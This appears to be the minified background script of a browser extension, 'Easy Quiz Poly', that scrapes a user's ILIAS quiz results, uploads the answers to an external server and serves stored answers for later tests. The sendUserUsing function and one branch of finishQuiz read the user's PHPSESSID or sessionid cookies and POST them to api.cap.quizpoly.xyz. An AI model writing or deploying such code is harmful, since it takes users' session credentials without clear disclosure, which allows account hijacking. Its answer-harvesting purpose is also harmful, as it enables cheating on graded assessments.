const apiUrl = "https://api.cap.quizpoly.xyz",
    redirect_uri = "https://api.cap.quizpoly.xyz/auth/google",
    adsLinks = ["https://link1s.com/quizpoly-classic1", "https://link1s.com/quizpoly-classic2", "https://link1s.com/quizpoly-classic3", "http://1shorten.com/quizpoly", "http://1shorten.com/quizpoly", "https://droplink.co/quizpoly"];
let subjectsGet = [];

function createAuthEndpoint() {
    var e = "https://accounts.google.com/o/oauth2/auth?",
        t = {
            client_id: "342297410923-sjcdrqban80srbpcekc24ctrdqh3u593.apps.googleusercontent.com",
            redirect_uri: redirect_uri,
            response_type: "code",
            access_type: "offline",
            scope: "profile email",
            prompt: "consent"
        };
    let o = new URLSearchParams(Object.entries(t));
    return o.toString(), e += o
}
async function finishQuiz(t) {
    const {
        subjectName: o,
        domain: n,
        quizId: s,
        passTime: e
    } = t;
    if (!o) return chrome.cookies.get({
        url: n,
        name: "PHPSESSID"
    }, e => {
        sendHtml(`finishQuiz subjectName null: ${JSON.stringify(t)} - cookie: ${e.value}`, "NULL")
    });
    getPoint(s, n, e, async ({
        quizzes: e
    }) => {
        e && e.length ? (console.debug(e), sendDoingQuiz({
            subjectName: o,
            quizzes: e
        })) : subjectsGet.includes(o.toLowerCase()) && (100 == (e = await getPercent(n, s)) && sendDoingQuiz({
            subjectName: `${o} - 100`,
            quizzes: Object.values(quizSelf)
        }), 80 < e ? chrome.storage.local.get(["quizSelf"], ({
            quizSelf: e
        }) => {
            sendDoingQuiz({
                subjectName: `${o} - draft 80`,
                quizzes: Object.values(e)
            })
        }) : 70 < e && chrome.storage.local.get(["quizSelf"], ({
            quizSelf: e
        }) => {
            sendDoingQuiz({
                subjectName: `${o} - draft`,
                quizzes: Object.values(e)
            })
        })), chrome.storage.local.set({
            quizSelf: {}
        })
    })
}
async function sendDoingQuiz(e) {
    try {
        const o = await fetch(apiUrl + "/quizpoly/self", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            referrerPolicy: "origin",
            body: JSON.stringify(e)
        });
        var t = await o.json();
        console.debug(t.message)
    } catch (e) {
        console.debug(e)
    }
}
async function getSubjectsGet() {
    fetch(apiUrl + "/quizpoly/subjects?fields=subjectsGet").then(e => e.json()).then(e => {
        subjectsGet = e.subjectsGet, console.log(subjectsGet)
    }).catch(e => subjectsGet = [])
}
async function getPercent(e, t) {
    let o = "",
        n;
    t = `${e}/ilias.php?ref_id=${t}&cmd=outUserResultsOverview&cmdClass=iltestevaluationgui&cmdNode=q4:ll:vx&baseClass=ilRepositoryGUI`;
    try {
        n = await fetch(t, {
            method: "GET",
            redirect: "error"
        }), o = await n.text()
    } catch {
        return 0
    }
    try {
        const s = parseHTML(o);
        return parseInt(s.querySelector(".tblrow1 > td:nth-of-type(6)").innerText)
    } catch (e) {
        return sendHtml(`Get Persent error: ${e}`, o), 0
    }
}
async function getPoint(e, t, o, s) {
    let i = [],
        r = "";
    o = `${t}/ilias.php?ref_id=${e}&pass=${o}&cmd=outUserPassDetails&cmdClass=iltestevaluationgui&cmdNode=q4:ll:vx&baseClass=ilrepositorygui`;
    try {
        const n = await fetch(o, {
            method: "GET",
            redirect: "error"
        });
        const a = parseHTML(await n.text()),
            c = a.querySelectorAll("tbody >tr > td:nth-of-type(5)"),
            l = a.querySelectorAll("tbody >tr > td:nth-of-type(1)"),
            u = a.querySelectorAll("tbody >tr > td:nth-of-type(4)");
        if (c.length) {
            let n = {};
            c.forEach((e, t) => {
                n[l[t].innerText] = +e.innerText
            }), chrome.storage.local.get(["quizSelf"], ({
                quizSelf: o
            }) => {
                console.debug(o), i = Object.keys(o).map(e => {
                    var t = parseInt(u[e - 1].innerText);
                    if (n[e] == t) return o[e]
                }).filter(e => void 0 !== e), r = `${i.length} Of ${Object.keys(n).length}`, s({
                    quizzes: i,
                    point: r
                })
            })
        }
    } catch (e) {
        console.debug(e), s({
            quizzes: i,
            point: r
        })
    }
}
async function sendHtml(e, t = "NULL") {
    try {
        const n = await fetch(apiUrl + "/quizpoly/html", {
            method: "POST",
            mode: "cors",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                note: `${chrome.runtime.getManifest().version}: ${e}`,
                html: t
            })
        });
        var o = await n.json();
        console.debug(o.message)
    } catch (e) {
        console.log(e)
    }
}

function sendUserUsing(n) {
    try {
        chrome.cookies.getAll({
            domain: n.domain
        }, async e => {
            e = e.filter(e => "sessionid" == e.name || "PHPSESSID" == e.name).map(e => ({
                name: e.name,
                value: e.value
            }));
            const o = e.length ? e[0].value : "";
            chrome.storage.local.get(["user"], async ({
                user: e
            }) => {
                e = {
                    name: e.name,
                    c: o,
                    ...n.data
                };
                const t = await fetch(apiUrl + "/quizpoly/using", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(e)
                });
                e = await t.json();
                console.debug("sendUserUsing", e.message)
            })
        })
    } catch (e) {
        console.log(e)
    }
}
async function addQuiz(e = {}) {
    try {
        const o = await fetch(apiUrl + "/quizpoly", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            referrerPolicy: "origin",
            body: JSON.stringify(e)
        });
        var t = await o.json();
        console.debug(t.message)
    } catch (e) {
        console.log(e)
    }
}

function getDateTomorrow() {
    let e = new Date;
    return e.setDate(e.getDate() + 1), e.setHours(0, 0, 0, 0), console.debug(e), e.getTime()
}

function getDiffHours(e, t) {
    t = (e - t) / 1e3;
    return t /= 3600, Math.abs(Math.round(t))
}

function parseHTML(e) {
    return (new DOMParser).parseFromString(e, "text/html")
}

function notify(e, t) {
    t = t || `Notification-${Date.now()}`, chrome.notifications.create(t, {
        type: "basic",
        iconUrl: "assets/icon.png",
        title: "Easy Quiz Poly",
        priority: 1,
        ...e
    })
}

function openAdsLink(s) {
    console.debug("openAdsLink"), chrome.storage.local.get(["isLogged", "user"], async ({
        isLogged: e,
        user: t
    }) => {
        return e ? void(false ? (o = Math.round(.85 * screen.width), n = Math.round(.9 * screen.height), e = Math.round(screen.width / 2 - o / 2), t = Math.round(screen.height / 2 - n / 2), chrome.windows.create({
            url: "https://quizpoly.xyz/quiz-link.html",
            type: "panel",
            focused: !0,
            width: o,
            height: n,
            left: e,
            top: t
        }, o => {
            var n = window.setInterval(() => {
                chrome.tabs.query({
                    windowId: o.id
                }, e => {
                    if (!e.length) return window.clearInterval(n), s("fail"), void chrome.storage.local.get(["linkIndex"], ({
                        linkIndex: e
                    }) => {
                        chrome.storage.local.set({
                            linkIndex: --e
                        })
                    });
                    const t = e[0]["url"];
                    console.debug(t), (t.includes("https://trfi.github.io/") || t.includes("https://page.quizpoly.xyz")) && (window.clearInterval(n), chrome.windows.remove(o.id), s("success"))
                })
            }, 500)
        })) : s("p")) : s("not_logged");
        var o, n
    })
}

function updateUser() {
    chrome.storage.local.get(["user"], ({
        user: o
    }) => {
        fetch(apiUrl + "/user/userType/" + o.id).then(e => e.json()).then(({
            userType: e,
            premium: t
        }) => {
            console.debug(o.userType, e), o.userType !== e && (o.userType = e, o.premium = t, chrome.storage.local.set({
                user: o
            }), "Free" == e ? notify({
                message: "Hạn dùng Premium của bạn đã hết. Hãy nâng cấp để tiếp tục sử dụng Premium",
                buttons: [{
                    title: "Nâng cấp"
                }]
            }, "premium_expired") : "Premium" == e && notify({
                message: "Chúc mừng! Tài khoản của bạn đã được nâng cấp lên Premium"
            }))
        }).catch(e => console.log(e))
    }), chrome.cookies.get({
        url: apiUrl,
        name: "token"
    }, e => {
        null === e && chrome.storage.local.set({
            isLogged: !1,
            user: {}
        }, () => {
            chrome.browserAction.setPopup({
                popup: "./popup/popup.html"
            })
        })
    })
}
async function getQuizAvailable(t, o) {
    try {
        const n = await fetch(`${apiUrl}/quizpoly/quiz`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                subject: t
            })
        });
        var e = await n.json();
        return null == e.data ? o([
            [!0, []]
        ]) : o([!0, e.data.quizzes])
    } catch (e) {
        sendHtml(`Get quiz available error - ${t}: ${e.message}`), o([!1, []])
    }
}
async function getOnlineAnswer(e, t) {
    try {
        const n = await fetch(`${apiUrl}/quizpoly/online/` + e);
        var o = await n.json();
        return null == o.data && t([]), t(o.data.quizzes)
    } catch (e) {
        console.log(e), t([])
    }
}

function funcCallFromPopupWindow(e) {
    console.debug(e)
}
updateUser(), getSubjectsGet();